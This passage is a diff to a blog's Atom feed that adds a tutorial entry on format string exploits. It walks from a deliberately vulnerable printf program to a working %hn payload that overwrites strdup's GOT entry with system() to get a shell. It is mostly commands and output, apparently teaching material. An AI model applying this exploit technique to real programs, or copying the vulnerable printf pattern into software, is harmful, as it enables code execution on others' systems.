@@ -1,5 +1,224 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all-en.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-04-28T00:00:00-07:00</updated><entry><title>PicoCTF Videos</title><link href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html" rel="alternate"></link><updated>2013-04-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-28:posts/2013/04/28/picoctf-videos.html</id><summary type="html">&lt;p&gt;For &lt;a href="picoctf.com"&gt;PicoCTF&lt;/a&gt; this year, I made some slides and recorded some
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/all-en.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2013-05-02T00:00:00-07:00</updated><entry><title>Introduction to Format String Exploits</title><link href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" rel="alternate"></link><updated>2013-05-02T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-02:posts/2013/05/02/introduction-to-format-string-exploits.html</id><summary type="html">&lt;h1&gt;How do format strings vulnerabilities work?&lt;/h1&gt;
+&lt;p&gt;Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error.
+If the programmer passes an attacker-controlled buffer as the argument to a &lt;code&gt;printf&lt;/code&gt; 
+(or any of the related functions, including &lt;code&gt;sprintf&lt;/code&gt;, &lt;code&gt;fprintf&lt;/code&gt;, etc), the attacker can perform
+writes to arbitrary memory addresses. The following program contains such an error:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="n"&gt;strncpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Since &lt;code&gt;printf&lt;/code&gt; has a variable number of arguments, it must use the format string to determine the number of arguments.
+In the case above, the attacker can pass the string &lt;code&gt;"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"&lt;/code&gt; and fool the &lt;code&gt;printf&lt;/code&gt; into thinking it has 5
+arguments. It will naively print the next 15 addresses on the stack, thinking they are its arguments:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;0xffffdddd 0x64 0xf7ec1289 0xffffdbdf 0xffffdbde (nil) 0xffffdcc4 0xffffdc64 (nil) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;At about 10 arguments up the stack, we can see a repeating pattern of &lt;code&gt;0x252070&lt;/code&gt; - those are our &lt;code&gt;%p&lt;/code&gt;s on the stack! We start our string
+with &lt;code&gt;AAAA&lt;/code&gt; to see this more explicitly:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s2"&gt;&amp;quot;AAAA%p %p %p %p %p %p %p %p %p %p&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;AAAA0xffffdde8 0x64 0xf7ec1289 0xffffdbef 0xffffdbee (nil) 0xffffdcd4 0xffffdc74 (nil) 0x41414141&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;0x41414141&lt;/code&gt; is the hex representation of &lt;code&gt;AAAA&lt;/code&gt;. We now have a way to pass an
+arbitrary value (in this case, we're passing &lt;code&gt;0x41414141&lt;/code&gt;) as an argument to &lt;code&gt;printf&lt;/code&gt;. At this point we will take
+advantage of another format string feature: in a format specifier, we can also select a specific argument. For example,
+&lt;code&gt;printf("%2$x", 1, 2, 3)&lt;/code&gt; will print 2. In general, we can do &lt;code&gt;printf("%&amp;lt;some number&amp;gt;$x")&lt;/code&gt; to select an arbitrary argument
+to &lt;code&gt;printf&lt;/code&gt;. In our case, we see that &lt;code&gt;0x41414141&lt;/code&gt; is the 10th argument to &lt;code&gt;printf&lt;/code&gt;, so we can simplify our string&lt;sup id="fnref:1"&gt;&lt;a class="footnote-ref" href="#fn:1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./a.out &lt;span class="s1"&gt;&amp;#39;AAAA%10$p&amp;#39;&lt;/span&gt;
+&lt;span class="go"&gt;AAAA0x41414141&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So how do we turn this into an arbitrary write primitive? Well, &lt;code&gt;printf&lt;/code&gt; has a &lt;em&gt;really interesting&lt;/em&gt; format specifier: &lt;code&gt;%n&lt;/code&gt;.
+From the man page of &lt;code&gt;printf&lt;/code&gt;: &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The number of characters written so far is stored into the  integer indicated  by the int * (or variant) pointer argument.  No argument is converted.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;If we were to pass the string &lt;code&gt;AAAA%10$n&lt;/code&gt;, we would write the value 4 to the address &lt;code&gt;0x41414141&lt;/code&gt;! We can use another 
+&lt;code&gt;printf&lt;/code&gt; feature to write larger values: if we do &lt;code&gt;printf("AAAA%100x")&lt;/code&gt;, 104 characters will be output 
+(because &lt;code&gt;%100x&lt;/code&gt; prints the argument padded to at least 100 characters). We can do &lt;code&gt;AAAA%&amp;lt;value-4&amp;gt;x%10$n&lt;/code&gt; to write an
+arbitrary value to &lt;code&gt;0x41414141&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The next thing to know is that almost certainly don't want to write all characters in one go: for example, 
+if we want to write the value &lt;code&gt;0x0804a004&lt;/code&gt;, we would have to write 134520836 characters to standard out! Instead,
+we break it up into two writes: first we write &lt;code&gt;0x0804&lt;/code&gt; (2052) to the higher two bytes of the target address and then we 
+write &lt;code&gt;0xa004&lt;/code&gt; (40964) to the lower two bytes of the target address. To do this, we will use &lt;code&gt;%hn&lt;/code&gt; to write only 2 bytes
+at a time. Such a format string might look like this: &lt;code&gt;CAAAAAAA%2044x%10$hn%38912x%11$hn&lt;/code&gt;. Lets break this down so we can
+understand it.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;CAAAAAAA&lt;/code&gt; - this is the higher two bytes of the target address (&lt;code&gt;0x41414143&lt;/code&gt;) 
+      and the lower two bytes of the target address (&lt;code&gt;0x41414141&lt;/code&gt;) &lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%2044x%10$hn&lt;/code&gt; - since we want to have written a total of 2052 bytes when we get to the 
+      first &lt;code&gt;%hn&lt;/code&gt;, and we have already written 8 bytes so far, we need to write an addition
+      2044 bytes.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%38912x%11$hn&lt;/code&gt; - since we want to have written a total of 40964 bytes when we get to the
+      second &lt;code&gt;%hn&lt;/code&gt;, and we since we have already written 2052 bytes so far, we need to write
+      an additional 38912 bytes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Here is an example of how this might be used &lt;sup id="fnref:2"&gt;&lt;a class="footnote-ref" href="#fn:2" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;./a.out &amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;CAAAAAAA%2044x%10$hn%38912x%11$hn&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;What can we do with them?&lt;/h1&gt;
+&lt;p&gt;Since a format string vulnerability gives us the ability to write an arbitrary value 
+to an arbitrary address, we can do a lot of things with it. Usually the easiest thing to do is
+write to a function pointer somewhere and turn our arbitrary write primitive 
+into arbitrary code execution. In dynamically linked programs, these are easy to find.
+When a program attempts to execute a function in a shared library, it does not necessarily
+know the location of that function at compile time. Instead, it jumps to a stub function that has a pointer
+to the correct location of the function in the shared library. This pointer (located in the global offset table, or GOT)
+is initialized at runtime when the stub function is first called. &lt;/p&gt;
+&lt;p&gt;For example, when &lt;code&gt;strcat&lt;/code&gt; is used in a program, the
+following piece of stub code allows the program to find the correct location in the shared library &lt;code&gt;libc&lt;/code&gt; at run time:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;span class="go"&gt;08048330 &amp;lt;strcat@plt&amp;gt;:&lt;/span&gt;
+&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
+&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
+&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here you can see that the &lt;code&gt;stcat@plt&lt;/code&gt; is the stub function that jumps to GOT entry for &lt;code&gt;strcat&lt;/code&gt; (the address &lt;code&gt;0x804a004&lt;/code&gt;),
+which is set at runtime to the location in &lt;code&gt;libc&lt;/code&gt; of the &lt;code&gt;strcat&lt;/code&gt; function. We can write any value we want
+to &lt;code&gt;0x804a004&lt;/code&gt;. When &lt;code&gt;strcat&lt;/code&gt; is used later in the program, the program will instead transfer code execution
+to the value we specified. A common technique is to overwrite the GOT entry with the address of the function &lt;code&gt;system&lt;/code&gt;, 
+thereby turning a call of &lt;code&gt;strcat(buffer, "hello")&lt;/code&gt; into the call &lt;code&gt;system(buffer)&lt;/code&gt; (if we can control the contents 
+of &lt;code&gt;buffer&lt;/code&gt;, we can get a shell!).&lt;/p&gt;
+&lt;h1&gt;An example&lt;/h1&gt;
+&lt;p&gt;For an example, we will exploit the following C program:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;span class="c1"&gt;// compile with gcc -m32 temp.c&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+  &lt;span class="n"&gt;strdup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Over plan is going to be to overwrite the GOT entry of &lt;code&gt;strdup&lt;/code&gt; with the address of &lt;code&gt;system&lt;/code&gt;, so the program
+will &lt;code&gt;printf(argv[1])&lt;/code&gt; then &lt;code&gt;system(argv[1])&lt;/code&gt;. Hence, our payload must be a valid argument to &lt;code&gt;system&lt;/code&gt; - we will
+start our payload with &lt;code&gt;sh;#&lt;/code&gt; (which will be &lt;code&gt;sh&lt;/code&gt; and cause the rest of the payload to be a comment. 
+This also has the advantage of being exactly 4 bytes long, which isn't important for this example 
+but is very useful in other cases). &lt;/p&gt;
+&lt;p&gt;For every format string exploit, our payload will eventually 
+look something like this: &lt;code&gt;&amp;lt;address&amp;gt;&amp;lt;address+2&amp;gt;%&amp;lt;number&amp;gt;x%&amp;lt;offset&amp;gt;$hn%&amp;lt;other number&amp;gt;x%&amp;lt;offset+1&amp;gt;$hn&lt;/code&gt;. 
+We prepare a payload that will be the same length as our final payload so we can start computing
+the correct offsets and addresses (note that we use &lt;code&gt;%hp&lt;/code&gt; and &lt;code&gt;%00000x&lt;/code&gt; so we can just modify the string
+in the last step without modifying its length):&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#AAAABBBB%00000x%17&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%18&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00xf7fcbff48048449&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Our goal is to find the correct offsets (instead of 17 and 18) so that the we output &lt;code&gt;sh;#AAAABBBB&amp;lt;garbabe&amp;gt;0x41414141&amp;lt;garbage&amp;gt;0x42424242&lt;/code&gt;. 
+This takes some work, but in our case the correct offsets are 99 and 100:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#AAAABBBB%00000x%99&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%100&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x4141414180484490x42424242
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It is important to note that our payload is &lt;em&gt;very&lt;/em&gt; sensitive to a change in length: adding one byte 
+to the end of the string will change the required offsets and perhaps mess up the alignment.&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#AAAABBBB%00000x%99&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%100&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)A&amp;quot;&lt;/span&gt;
+&lt;span class="gp"&gt;sh;#&lt;/span&gt;AAAABBBB00x2e00000080484490x6f2e612fA
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is because the arguments are passed onto the stack before the start of our program, and so changing the
+length of the arguments will change their alignment and the initial stack location for the program itself. In
+order to have our exploit work consistently, we need to ensure that the payload is at a consistent alignment 
+(and at a consistent offset above us on the stack) by being careful to control the amount of stuff on the stack.
+This is also why we are using &lt;code&gt;env -i&lt;/code&gt; as a wrapper for our program (it clears the environment, which is also 
+passed onto the stack before the start of a program).&lt;/p&gt;
+&lt;p&gt;Anyways, lets find the &lt;code&gt;strdup&lt;/code&gt; GOT entry:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; objdump -d a.out
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;span class="go"&gt;08048330 &amp;lt;strdup@plt&amp;gt;:&lt;/span&gt;
+&lt;span class="go"&gt; 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004&lt;/span&gt;
+&lt;span class="go"&gt; 8048336:       68 08 00 00 00          push   $0x8&lt;/span&gt;
+&lt;span class="go"&gt; 804833b:       e9 d0 ff ff ff          jmp    8048310 &amp;lt;_init+0x3c&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now we know where to write. We want to the address of &lt;code&gt;system&lt;/code&gt; to the &lt;code&gt;strdup&lt;/code&gt; got entry, &lt;code&gt;0x804a004&lt;/code&gt;. 
+For now, we plug in our address into the payload and make sure everything still works out:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="se"&gt;\x&lt;/span&gt;06&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08%00000x%99&lt;span class="nv"&gt;$hp&lt;/span&gt;%00000x%100&lt;span class="nv"&gt;$hp&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="gp"&gt;sh;#&lt;/span&gt;00x804a00480484490x804a006
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The next step is to figure out where to write. First, since it is a 32 bit binary, we can disable libc randomization. 
+We disable libc randomization via:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;ulimit&lt;/span&gt; -s unlimited
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now the address of &lt;code&gt;system&lt;/code&gt; is at a deterministic location in memory. 
+We can just open up the program in &lt;code&gt;gdb&lt;/code&gt; and print the address of &lt;code&gt;system&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb -q a.out
+&lt;span class="go"&gt;Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) b main&lt;/span&gt;
+&lt;span class="go"&gt;Breakpoint 1 at 0x8048417&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) r&lt;/span&gt;
+&lt;span class="go"&gt;Starting program: /home/ppp/a.out &lt;/span&gt;
+
+&lt;span class="go"&gt;Breakpoint 1, 0x08048417 in main ()&lt;/span&gt;
+&lt;span class="go"&gt;(gdb) p system&lt;/span&gt;
+&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0x555c2250 &amp;lt;system&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;All right, now we know that we need to write &lt;code&gt;0x555c2250&lt;/code&gt; (the address of system)
+to the address &lt;code&gt;0x804a004&lt;/code&gt; (the got entry of &lt;code&gt;strdup&lt;/code&gt;). We are doing this in two parts. 
+First, we write &lt;code&gt;0x2250&lt;/code&gt; to the two bytes at &lt;code&gt;0x804a004&lt;/code&gt; then we write &lt;code&gt;0x555c&lt;/code&gt; to
+the two bytes at &lt;code&gt;0x804a006&lt;/code&gt;. We can figure out how many bytes to write in python:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python
+&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x2250 - 12 &lt;span class="c"&gt;# We&amp;#39;ve already written 12 bytes (&amp;quot;sh;#AAAABBBB&amp;quot;).&lt;/span&gt;
+&lt;span class="go"&gt;8772&lt;/span&gt;
+&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; 0x555c - 0x2250 &lt;span class="c"&gt;# We&amp;#39;ve already written 0x2250 bytes.&lt;/span&gt;
+&lt;span class="go"&gt;13068&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now we plug these values into our payload, change the &lt;code&gt;%hp&lt;/code&gt; to &lt;code&gt;%hn&lt;/code&gt;. Note that when 
+we change the &lt;code&gt;%00000x&lt;/code&gt; to &lt;code&gt;%08772&lt;/code&gt;, we leave the leading &lt;code&gt;0&lt;/code&gt; so that our string
+stays the same length. Here is the final exploit:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; env -i ./a.out &lt;span class="s2"&gt;&amp;quot;$(python -c &amp;#39;import sys; sys.stdout.write(&amp;quot;&lt;/span&gt;sh;#&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08&lt;span class="se"&gt;\x&lt;/span&gt;06&lt;span class="se"&gt;\x&lt;/span&gt;a0&lt;span class="se"&gt;\x&lt;/span&gt;04&lt;span class="se"&gt;\x&lt;/span&gt;08%08772x%99&lt;span class="nv"&gt;$hn&lt;/span&gt;%13068x%100&lt;span class="nv"&gt;$hn&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;)&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="gp"&gt;sh;#&lt;/span&gt;..&amp;lt;garbage&amp;gt;..sh-4.2&lt;span class="nv"&gt;$ &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Woo hoo, we got our shell!&lt;/p&gt;
+&lt;div class="footnote"&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+&lt;li id="fn:1"&gt;
+&lt;p&gt;You'll note the single quotes - &lt;code&gt;$&lt;/code&gt; is a special symbol on the shell and would otherwise need to be escaped.&amp;#160;&lt;a class="footnote-backref" href="#fnref:1" rev="footnote" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id="fn:2"&gt;
+&lt;p&gt;You'll note that we use print the exploit string in a python subshell. 
+This isn't strictly necessary in this case, but for more interesting exploits the ability to print escape characters
+and use arbitrary bytes in our payload is very useful. We also print via &lt;code&gt;sys.stdout.write&lt;/code&gt; to prevent the newline
+at the end we would get if we otherwise used &lt;code&gt;print&lt;/code&gt; and surround the subshell in double quotes in case the payload had
+whitespace in it.&amp;#160;&lt;a class="footnote-backref" href="#fnref:2" rev="footnote" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;</summary><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>PicoCTF Videos</title><link href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html" rel="alternate"></link><updated>2013-04-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-04-28:posts/2013/04/28/picoctf-videos.html</id><summary type="html">&lt;p&gt;For &lt;a href="picoctf.com"&gt;PicoCTF&lt;/a&gt; this year, I made some slides and recorded some
 video tutorials. I'll probably turn these into better tutorials on this blog at
 some later point.&lt;/p&gt;
 &lt;h1&gt;Introduction to Return Oriented Programming (ROP)&lt;/h1&gt;
